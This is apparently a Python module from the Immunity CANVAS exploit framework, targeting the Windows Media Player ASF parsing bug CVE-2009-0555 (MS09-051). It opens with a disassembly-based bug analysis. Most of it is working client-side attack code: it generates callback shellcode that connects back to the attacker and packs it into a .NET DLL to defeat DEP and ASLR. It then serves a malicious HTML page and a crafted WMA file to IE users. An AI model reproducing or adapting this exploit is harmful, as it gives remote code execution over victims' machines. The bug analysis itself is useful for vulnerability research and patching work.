#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2008-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator,win32shell
import binascii
from pelib import PElib
import random
from libs.spkproxy import header,body
from canvasengine import WIN32MOSDEF
import shellcode.standalone.windows.payloads as payloads

NAME                            = 'ASF_Audio_media Parsing bug'
DESCRIPTION                     = 'ASF_Audio_media Parsing bug'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Repeatability']  = 'One Shot'
DOCUMENTATION['Date public']    = '10/13/2009' #Dates are in US Format
DOCUMENTATION['CVE Name']       = 'CVE-2009-0555'
DOCUMENTATION['CVS URL']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0555'
DOCUMENTATION['MSRC']           = 'http://www.microsoft.com/technet/security/Bulletin/MS09-051.mspx'
DOCUMENTATION['Note']           = """

This is a client-side exploit - so use it via sploitd.

This module was tested on Windows XP SP3 / IE7
It uses the .NET DLL trick, effectively defeating DEP and ASLR.

"""

VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Clientside'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['2000','XP','2003','Vista'] #what it affects, but not what it's tested on?
PROPERTY['MSADV']               = 'MS09-051'
PROPERTY['DELIVERY']            = 'HTTP'

NOTES="""
MS09-051 (KB9545155): Memory corruption in parsing of ASF_Audio_media Stream Properties Objects.

From the ASF spec:

"
When the Stream Type of the Stream Properties Object has the value ASF_Audio_Media, the ASF audio
media type that populates the Type-Specific Data field of the Stream Properties Object is represented
using the following structure (the WAVEFORMATEX structure).

Field name                  Field type                  Size (bits)
===================================================================
Codec ID / Format Tag       WORD                        16          (0x000a)
Number of Channels          WORD                        16          (0x0001)
Samples Per Second          DWORD                       32
Number of Bytes Per Second  DWORD                       32
Block Alignment             WORD                        16
Bits Per Sample             WORD                        16
Codec Specific Data Size    WORD                        16
Codec Specific Data         BYTE                        varies
"

The ASF_Audio_Media GUID is: F8699E40-5B4D-11CF-A8FD-00805F5C442B


Bug Description:
================

wmspdmod.dll loads the samples per second DWORD from ASF_Audio_Media stream properties object.
This DWORD is used without further checking in an fmul, the outcome of which determines
the index of a memcpy into an integer array. By supplying a large enough index, one can
corrupt process critical memory, including function pointers, at a relative offset from the
integer array.


Bug Details:
============

...
.text:14DFF2BF loc_14DFF2BF:                           ; CODE XREF: patched1+3D9j
.text:14DFF2BF                 mov     eax, [esi]      ; controlled framerate dword loaded here
.text:14DFF2C1                 fild    dword ptr [esi] ; load framerate onto floating point stack
.text:14DFF2C3                 test    eax, eax
.text:14DFF2C5                 jge     short loc_14DFF2CD
.text:14DFF2C7                 fadd    ds:flt_14DE19F0 ; skipped
.text:14DFF2CD
.text:14DFF2CD loc_14DFF2CD:                           ; CODE XREF: patched1+413j
.text:14DFF2CD                 fld     ds:dbl_14DE19E8 ; load multiplier onto floating point stack (0.0185)
.text:14DFF2D3                 fmul    st, st(1)       ; fmul framerate.0000 with 0.0185
.text:14DFF2D5                 fld     ds:flt_14DE19E0
.text:14DFF2DB                 fadd    st(1), st
.text:14DFF2DD                 fxch    st(1)
.text:14DFF2DF                 call    sub_14DFD7BD    ; converts double precision scalar float into double word integer (result eax)
.text:14DFF2E4                 fxch    st(1)
.text:14DFF2E6                 fmul    ds:dbl_14DE19D8
.text:14DFF2EC                 mov     edi, eax        ; result into edi
.text:14DFF2EE                 mov     [esi+1A4h], edi ; fmul result set into esi+1A4
.text:14DFF2F4                 faddp   st(1), st
.text:14DFF2F6                 call    sub_14DFD7BD
.text:14DFF2FB                 mov     [esi+1A8h], eax
.text:14DFF301                 lea     eax, [edi+8]    ; fmul result + 8 into eax
.text:14DFF304                 mov     [esi+1E0h], eax ; fmul result + 8 is used as src data offset

src data inited here:
...
.text:14E01C41                 cmp     [esi+0D0h], bx
.text:14E01C48                 mov     edi, [esi+1E0h]
.text:14E01C4E                 movzx   eax, word ptr [esi+0D2h]
.text:14E01C55                 lea     edi, [ebp+edi*4+var_209C] ; src data offset
.text:14E01C5C                 mov     [ebp+var_30], edi

...
pre-memcpy here:

.text:14E02394                 lea     ebx, [esi+1A4h]
.text:14E0239A                 mov     ecx, [ebx]            ; fmul result loaded here into ecx
.text:14E0239C                 lea     eax, [esi+328h]
.text:14E023A2                 lea     eax, [eax+ecx*4+0A0h] ; integer array index (ecx) is controlled
.text:14E023A9                 push    eax             ; void *
.text:14E023AA                 mov     eax, [ebp+var_30]     ; src data ptr loaded ...
.text:14E023AD                 add     eax, edi
.text:14E023AF                 push    eax             ; void *
.text:14E023B0                 call    sub_14E350FB    ; memcpy-wrapper function

...
memcpy into relative offset controlled dest buffer:

.text:14E350FB ; int __stdcall sub_14E350FB(void *, void *, __int16)
.text:14E350FB sub_14E350FB    proc near               ; CODE XREF: sub_14E00C35+DCp
.text:14E350FB                                         ; sub_14E00C35+14Fp ...
.text:14E350FB
.text:14E350FB arg_0           = dword ptr  8
.text:14E350FB arg_4           = dword ptr  0Ch
.text:14E350FB arg_8           = word ptr  10h
.text:14E350FB
.text:14E350FB                 mov     edi, edi
.text:14E350FD                 push    ebp
.text:14E350FE                 mov     ebp, esp
.text:14E35100                 movsx   eax, [ebp+arg_8]
.text:14E35104                 shl     eax, 2
.text:14E35107                 push    eax             ; size_t
.text:14E35108                 push    [ebp+arg_0]     ; void *
.text:14E3510B                 push    [ebp+arg_4]     ; void * ; dest is controlled
.text:14E3510E                 call    memcpy
.text:14E35113                 add     esp, 0Ch
.text:14E35116                 pop     ebp
.text:14E35117                 retn    0Ch
.text:14E35117 sub_14E350FB    endp

...

Can take convenient execution control via:

.text:14DFEE78                 mov     eax, [esi+14C4h]
.text:14DFEE7E                 test    eax, eax
.text:14DFEE80                 jz      short loc_14DFEE90
.text:14DFEE82                 push    dword ptr [esi+1464h]
.text:14DFEE88                 call    eax

"""

CHANGELOG="""
Tested on Windows XP SP3 / IE7
It uses the .NET DLL trick, effectively defeating DEP and ASLR.
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        #self.searchMethod   = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent      = [('Mozilla/','MSIE','')]
        self.badstring      = ''
        self.version        = 0
        self.name           = NAME
        self.filename       = 'index.html'
        self.wmafile        = 'file.wma'
        self.wmasrc         = os.path.join('Resources', 'MS09051.wma')
        self.dllfile        = 'exploit.dll'
        self.subesp         = 0x100
        # WMP11 XP SP3 trigger with pseudo-controlled wmspdmod.dll function ptr
        self.pc             = 0x4199CE09
        return

    def neededListenerTypes(self):
        return [WIN32MOSDEF]

    def createShellcode(self):
        p               = payloads.payloads(VirtualProtect = True)
        sc              = p.forkload(self.callback.ip,
                                     self.callback.port,
                                     restorehash = True,
                                     load_winsock = True)
        self.shellcode  = p.assemble(sc)     
        return self.shellcode
    
    def run(self):
        self.host       = self.target.interface
        self.filename   = self.argsDict.get('filename',self.filename)
        class cl:
            def __init__(self):
                pass
        c           = cl()
        c.URL       = self.dllfile
        filedata    = self.makefile(c)
        fd          = file(c.URL,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('[+] Opening %s for output'%self.filename)
        c.URL       = self.filename
        filedata    = self.makefile(c)
        fd          = file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('[+] Wrote to %s'%self.filename)
        self.log('NOTE: Include Resources/MS09051.wma, also an exploit.dll was created and need to be included')
        return 1

    def makefile(self, clientheader):
        
        if self.dllfile in clientheader.URL:
            self.log('[+] Sending .NET DLL')
            p = PElib()
            return p.createDotNETPEFileBuf(self.createShellcode(), self.pc)
        
        elif self.wmafile in clientheader.URL:
            self.log('[+] Sending ASF file')
            wma = ''            
            try:
                fd  = open(self.wmasrc, 'rb')
                wma = fd.read()
                fd.close()
            except:
                self.log('[-] Could not read ASF file!')
            return wma
            
        else:
            self.log('[+] Sending HTML file')
            html="""<html>
<body>
<OBJECT CLASSID='%d%s#exploit.Shellcode'></OBJECT>
<OBJECT ID="MediaPlayer" CLASSID="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95" CODEBASE="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab# Version=5,1,52,701" STANDBY="Loading Microsoft Windows Media Player components..." TYPE="application/x-oleobject" width="280" height="46">
<param name="fileName" value="%s">
<param name="animationatStart" value="true">
<param name="transparentatStart" value="true">
<param name="autoStart" value="true">
<param name="showControls" value="true">
<param name="Volume" value="-300">
<embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" src="%s" name="MediaPlayer" width=280 height=46 autostart=1 showcontrols=1 volume=-300>
</OBJECT>
</body>
</html>"""%(random.randint(0,65535), self.dllfile, self.wmafile, self.wmafile)
            return html

    def makesploit(self,clientheader,clientbody):
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        self.log('[+] User agent of connecting host: %s' % user_agent)
        
        if not user_agent.count('MSIE') and not user_agent.count('NSPlayer'):
            self.log('[-] Non IE browser connected - returning None')
            return None,None
        
        data = self.makefile(clientheader)
        if not data:
            return None,None
        
        b.setBody(data)
        
        if '<html>' in data.lower():
            h.addHeader('Content-Type','text/html')
        else:
            h.addHeader('Content-Type','application/octet-stream')
        
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
